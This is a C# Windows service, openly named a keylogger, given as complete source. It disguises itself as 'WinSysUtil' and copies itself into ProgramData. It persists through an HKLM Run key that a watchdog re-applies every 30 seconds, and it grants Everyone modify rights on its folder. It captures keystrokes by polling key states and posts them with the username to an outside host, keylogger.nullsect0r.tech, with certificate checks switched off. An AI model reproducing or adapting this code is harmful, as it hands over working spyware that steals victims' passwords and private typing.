using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Net.Http;
using System.Windows.Forms;
using System.Security.AccessControl;
using System.Security.Principal;

namespace KeyLoggerService
{
    public partial class Service1 : ServiceBase
    {
        private static string buf = "";
        private static readonly HttpClient client = new HttpClient();
        private bool _stopping = false;
        private Thread _watchdogThread;

        public Service1()
        {
            InitializeComponent();
            SetupTls();
        }

        private static void SetupTls()
        {
            try
            {
                System.Net.ServicePointManager.SecurityProtocol |= System.Net.SecurityProtocolType.Tls12;
                System.Net.ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
            }
            catch { }
        }

        protected override void OnStart(string[] args)
        {
            LogToFile($"Service starting. Session ID: {Process.GetCurrentProcess().SessionId}. User: {Environment.UserName}");
            _stopping = false;
            
            EnsureRegistryPersistence();
            
            _watchdogThread = new Thread(WatchdogLoop);
            _watchdogThread.IsBackground = true;
            _watchdogThread.Start();
        }

        private void EnsureRegistryPersistence()
        {
            try
            {
                string appPath = Process.GetCurrentProcess().MainModule.FileName;
                string targetPath = @"C:\ProgramData\WinSysUtil\WinSysUtil.exe";
                
                // 1. Ensure directory exists
                string dir = Path.GetDirectoryName(targetPath);
                if (!Directory.Exists(dir))
                {
                    Directory.CreateDirectory(dir);
                    GrantEveryoneModify(dir);
                }

                // 2. Copy itself to ProgramData if not already there
                if (!appPath.Equals(targetPath, StringComparison.OrdinalIgnoreCase))
                {
                    File.Copy(appPath, targetPath, true);
                    LogToFile($"Copied executable to {targetPath}");
                }

                // 3. Set Registry Run key for all users
                using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    if (key != null)
                    {
                        key.SetValue("WinSysUtil", $"\"{targetPath}\" --logger");
                        LogToFile("Registry Run key set successfully.");
                    }
                }
            }
            catch (Exception ex)
            {
                LogToFile($"EnsureRegistryPersistence Error: {ex.Message}");
            }
        }

        private void WatchdogLoop()
        {
            while (!_stopping)
            {
                try
                {
                    // Every 30 seconds, ensure the registry key and file are still there
                    EnsureRegistryPersistence();
                }
                catch { }
                Thread.Sleep(30000);
            }
        }

        protected override void OnStop()
        {
            _stopping = true;
        }

        public static void RunAsLogger()
        {
            try
            {
                SetupTls();
                LogToFile($"Logger process starting in session {Process.GetCurrentProcess().SessionId}. User: {Environment.UserName}");

                // Immediate check-in
                Task.Run(() => SendPayload("<STARTUP>"));

                DateTime lastHeartbeat = DateTime.Now;
                while (true)
                {
                    Thread.Sleep(100);

                    if ((DateTime.Now - lastHeartbeat).TotalSeconds > 60)
                    {
                        lastHeartbeat = DateTime.Now;
                        Task.Run(() => SendPayload("<HEARTBEAT>"));
                    }

                    CaptureKeys();
                }
            }
            catch (Exception ex)
            {
                LogToFile($"Logger Fatal Error: {ex.Message}\n{ex.StackTrace}");
            }
        }

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);

        private static void CaptureKeys()
        {
            // An even more advanced check
            bool shift = false;
            short shiftState = (short)GetAsyncKeyState(16);
            if ((shiftState & 0x8000) == 0x8000)
            {
                shift = true;
            }

            bool caps = (GetKeyState(0x14) & 0x0001) != 0;
            bool isBig = shift | caps;

            for (int i = 0; i < 255; i++)
            {
                int state = GetAsyncKeyState(i);
                if ((state & 0x8000) != 0) // Key is pressed
                {
                    // Check for Space and Enter
                    if (((Keys)i) == Keys.Space) { buf += " "; continue; }
                    if (((Keys)i) == Keys.Enter) { buf += "&#x0a;"; continue; }

                    // Skip mouse buttons
                    if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton) continue;

                    // Skip Shift, Ctrl, Alt, and other modifier keys
                    if (((Keys)i).ToString().Contains("Shift") || ((Keys)i) == Keys.Capital || ((Keys)i) == Keys.NumLock) continue;
                    if (((Keys)i) == Keys.LControlKey || ((Keys)i) == Keys.RControlKey) continue;
                    if (((Keys)i) == Keys.LMenu || ((Keys)i) == Keys.RMenu) continue;

                    // Skip other non-essential keys
                    if (((Keys)i).ToString().Contains("OemBackslash") || ((Keys)i).ToString().Contains("Scroll")) continue;
                    if (((Keys)i) == Keys.Escape || ((Keys)i) == Keys.Tab) continue;
                    if (((Keys)i) == Keys.Prior || ((Keys)i) == Keys.Next) continue;
                    if (((Keys)i) == Keys.Home || ((Keys)i) == Keys.End) continue;
                    if (((Keys)i) == Keys.Up || ((Keys)i) == Keys.Down || ((Keys)i) == Keys.Left || ((Keys)i) == Keys.Right) continue;
                    if (((Keys)i) == Keys.LWin || ((Keys)i) == Keys.RWin) continue;

                    // Handle single character keys
                    if (((Keys)i).ToString().Length == 1 || ((Keys)i) >= Keys.D0 && ((Keys)i) <= Keys.D9)
                    {
                        char key = (char)0;
                        string keyName = ((Keys)i).ToString();
                        if (keyName.Length == 1)
                        {
                            key = keyName[0];
                        }
                        else if (keyName.StartsWith("D") && keyName.Length == 2)
                        {
                            key = keyName[1];
                        }

                        if (key != 0)
                        {
                            if (char.IsLetter(key) && isBig)
                            {
                                buf += char.ToUpper(key);
                            }
                            else if (char.IsLetter(key) && !isBig)
                            {
                                buf += char.ToLower(key);
                            }
                            else
                            {
                                buf += key;
                            }
                        }
                    }
                    else
                    {
                        // Wrap non-single-character keys in angle brackets
                        buf += $"<{((Keys)i).ToString()}>";
                    }

                    if (buf.Length >= 5)
                    {
                        string toSend = buf;
                        buf = "";
                        LogToFile($"Threshold reached, sending {toSend.Length} chars from session {Process.GetCurrentProcess().SessionId}");
                        Task.Run(() => SendPayload(toSend));
                    }
                }
            }
        }

        private static async Task SendPayload(string payload)
        {
            try
            {
                // Create a clean URL each time to avoid any caching or state issues if username changes (though it shouldn't)
                string currentUsername = Environment.UserName == "SYSTEM" ? Environment.MachineName : Environment.UserName;
                string url = $"https://keylogger.nullsect0r.tech/log?username={Uri.EscapeDataString(currentUsername)}";

                var content = new StringContent(payload, Encoding.UTF8, "text/plain");
                var response = await client.PostAsync(url, content);
                
                if (response.IsSuccessStatusCode)
                {
                     LogToFile($"Successfully sent payload: {payload.Substring(0, Math.Min(payload.Length, 15))}...");
                }
                else
                {
                     LogToFile($"Error: {response.StatusCode} - {response.ReasonPhrase}");
                }
            }
            catch (Exception ex)
            {
                LogToFile($"Exception: {ex.Message}\n{ex.StackTrace}");
            }
        }

        private void GrantEveryoneModify(string path)
        {
            try
            {
                DirectoryInfo dInfo = new DirectoryInfo(path);
                DirectorySecurity dSecurity = dInfo.GetAccessControl();
                dSecurity.AddAccessRule(new FileSystemAccessRule(
                    new SecurityIdentifier(WellKnownSidType.WorldSid, null),
                    FileSystemRights.Modify | FileSystemRights.Synchronize,
                    InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                    PropagationFlags.None,
                    AccessControlType.Allow));
                dInfo.SetAccessControl(dSecurity);
            }
            catch (Exception ex)
            {
                LogToFile($"GrantEveryoneModify Error: {ex.Message}");
            }
        }

        public static void LogToFile(string message)
        {
            try
            {
                string logPath = @"C:\ProgramData\WinSysUtil\service.log";
                string dir = Path.GetDirectoryName(logPath);
                if (!Directory.Exists(dir))
                {
                    Directory.CreateDirectory(dir);
                    // GrantEveryoneModify is handled when directory is first created in LogToFile
                    // but we ensure it here too for the service path
                    try
                    {
                        DirectoryInfo dInfo = new DirectoryInfo(dir);
                        DirectorySecurity dSecurity = dInfo.GetAccessControl();
                        dSecurity.AddAccessRule(new FileSystemAccessRule(
                            new SecurityIdentifier(WellKnownSidType.WorldSid, null),
                            FileSystemRights.Modify | FileSystemRights.Synchronize,
                            InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                            PropagationFlags.None,
                            AccessControlType.Allow));
                        dInfo.SetAccessControl(dSecurity);
                    }
                    catch { }
                }
                
                // Use a lock-free or retry-based approach for shared logging
                for (int i = 0; i < 5; i++)
                {
                    try
                    {
                        using (FileStream fs = new FileStream(logPath, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
                        using (StreamWriter sw = new StreamWriter(fs))
                        {
                            sw.WriteLine($"{DateTime.Now}: {message}");
                        }
                        break;
                    }
                    catch
                    {
                        Thread.Sleep(100);
                    }
                }
            }
            catch { }
        }
    }
}
